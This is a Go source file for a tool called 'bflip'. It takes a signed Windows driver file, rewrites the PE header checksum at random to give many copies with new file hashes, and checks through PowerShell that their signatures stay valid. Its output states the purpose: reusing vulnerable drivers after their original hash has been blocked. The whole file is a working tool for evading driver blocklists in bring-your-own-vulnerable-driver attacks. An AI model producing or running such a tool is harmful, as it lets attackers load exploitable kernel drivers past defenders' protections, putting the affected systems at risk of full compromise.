package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type PEHeader struct {
	DOSHeader      []byte
	PESignature    []byte
	FileHeader     []byte
	OptionalHeader []byte
}

type Region struct {
	Start int
	End   int
	Name  string
}

type GenerationStats struct {
	TotalGenerated    int
	ValidSignatures   int
	UniqueHashes      map[string]bool
	FilesCreated      []string
	OriginalChecksum  uint32
	GeneratedChecksums []uint32
}

func main() {
	var numFiles int
	var filename string
	flag.IntVar(&numFiles, "n", 1, "number of files to generate")
	flag.StringVar(&filename, "f", "", "input .sys file to process")
	flag.Parse()

	if filename == "" {
		fmt.Println("[+] usage: bflip -f <sys_file> [-n <count>]")
		os.Exit(1)
	}
	
	if filepath.Ext(filename) != ".sys" {
		log.Fatal("[-] error: file must have .sys extension")
	}

	if _, err := os.Stat(filename); os.IsNotExist(err) {
		log.Fatal("[-] file does not exist")
	}
	
	if numFiles < 1 {
		log.Fatal("[-] error: number of files must be at least 1")
	}

	fmt.Printf("processing file: %s\n", filename)
	originalData, err := os.ReadFile(filename)
	if err != nil {
		log.Fatalf("[-] error reading file: %v", err)
	}
	originalHash := calculateSHA256(originalData)
	fmt.Printf("[+] original file hash: %s\n", originalHash)
	fmt.Printf("[+] original file size: %d bytes\n", len(originalData))

	checksumOffset, err := findChecksumField(originalData)
	if err != nil {
		log.Fatalf("[-] error: %v", err)
	}

	originalChecksum := binary.LittleEndian.Uint32(originalData[checksumOffset : checksumOffset+4])
	fmt.Printf("[+] original checksum: 0x%08X\n", originalChecksum)
	fmt.Printf("[+] checksum offset: %d (0x%X)\n\n", checksumOffset, checksumOffset)

	rand.Seed(time.Now().UnixNano())

	stats := &GenerationStats{
		UniqueHashes:       make(map[string]bool),
		FilesCreated:       make([]string, 0),
		OriginalChecksum:   originalChecksum,
		GeneratedChecksums: make([]uint32, 0),
	}

	fmt.Printf("generating %d file(s)...\n\n", numFiles)

	for i := 0; i < numFiles; i++ {
		modifiedData := make([]byte, len(originalData))
		copy(modifiedData, originalData)

		newChecksum := generateRandomChecksum(originalChecksum)
		binary.LittleEndian.PutUint32(modifiedData[checksumOffset:checksumOffset+4], newChecksum)

		newHash := calculateSHA256(modifiedData)

		outputFilename := generateOutputFilename(filename, i+1)

		err = os.WriteFile(outputFilename, modifiedData, 0644)
		if err != nil {
			log.Fatalf("[-] error writing modified file: %v", err)
		}

		stats.TotalGenerated++
		stats.UniqueHashes[newHash] = true
		stats.FilesCreated = append(stats.FilesCreated, outputFilename)
		stats.GeneratedChecksums = append(stats.GeneratedChecksums, newChecksum)

		isValid, _ := verifySignature(outputFilename)
		if isValid {
			stats.ValidSignatures++
		}

		fmt.Printf("[%d/%d] checksum: 0x%08X | hash: %s | signature: %s\n",
			i+1, numFiles, newChecksum, newHash[:16]+"...", formatBool(isValid))
	}

	displayStats(stats, originalHash, filename)
}
func calculateSHA256(data []byte) string {
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

func findChecksumField(data []byte) (int, error) {
	if len(data) < 64 {
		return 0, fmt.Errorf("[-] file too small to be a valid PE file")
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return 0, fmt.Errorf("[-] invalid DOS header signature")
	}
	peOffset := int(binary.LittleEndian.Uint32(data[60:64]))

	if peOffset >= len(data)-24 {
		return 0, fmt.Errorf("[-] invalid PE header offset")
	}
	if data[peOffset] != 'P' || data[peOffset+1] != 'E' || data[peOffset+2] != 0 || data[peOffset+3] != 0 {
		return 0, fmt.Errorf("[-] invalid PE signature")
	}
	coffHeaderOffset := peOffset + 4
	sizeOfOptionalHeader := int(binary.LittleEndian.Uint16(data[coffHeaderOffset+16 : coffHeaderOffset+18]))

	if sizeOfOptionalHeader < 64 {
		return 0, fmt.Errorf("[-] optional header too small")
	}
	optionalHeaderOffset := coffHeaderOffset + 20
	checksumOffset := optionalHeaderOffset + 64

	if checksumOffset+4 > len(data) {
		return 0, fmt.Errorf("[-] checksum field out of bounds")
	}

	return checksumOffset, nil
}

func generateRandomChecksum(original uint32) uint32 {
	for {
		newChecksum := rand.Uint32()
		if newChecksum != original {
			return newChecksum
		}
	}
}

func generateOutputFilename(originalFilename string, index int) string {
	ext := filepath.Ext(originalFilename)
	base := originalFilename[:len(originalFilename)-len(ext)]
	timestamp := time.Now().Format("20060102_150405")
	return fmt.Sprintf("%s_flipped_%s_%s%s", base, timestamp, padNumber(index, 4), ext)
}

func padNumber(num int, width int) string {
	str := strconv.Itoa(num)
	for len(str) < width {
		str = "0" + str
	}
	return str
}

func formatBool(b bool) string {
	if b {
		return "valid"
	}
	return "invalid"
}

func displayStats(stats *GenerationStats, originalHash string, filename string) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("generation summary")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("original file:       %s\n", filename)
	fmt.Printf("original hash:       %s\n", originalHash)
	fmt.Printf("original checksum:   0x%08X\n\n", stats.OriginalChecksum)
	
	fmt.Printf("files generated:     %d\n", stats.TotalGenerated)
	fmt.Printf("unique hashes:       %d\n", len(stats.UniqueHashes))
	fmt.Printf("valid signatures:    %d\n", stats.ValidSignatures)
	fmt.Printf("invalid signatures:  %d\n", stats.TotalGenerated-stats.ValidSignatures)
	
	if stats.ValidSignatures > 0 {
		successRate := float64(stats.ValidSignatures) / float64(stats.TotalGenerated) * 100
		fmt.Printf("success rate:        %.2f%%\n", successRate)
	}
	
	fmt.Println("\n" + strings.Repeat("-", 60))
	fmt.Printf("theoretical maximum: 2^32 = %d possible variations\n", uint64(1)<<32)
	fmt.Printf("collision space:     %.8f%% explored\n", 
		float64(stats.TotalGenerated)/float64(uint64(1)<<32)*100)
	
	if stats.ValidSignatures > 0 {
		fmt.Println("\n" + strings.Repeat("-", 60))
		fmt.Println("[+] you may reuse these vulnerable drivers if original hash gets blocked")
	}
	
	fmt.Println(strings.Repeat("=", 60))
}

func verifySignature(filename string) (bool, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("(Get-AuthenticodeSignature '%s').Status -eq 'Valid'", filename))
	output, err := cmd.Output()
	if err != nil {
		return false, err
	}
	return strings.TrimSpace(string(output)) == "True", nil
}
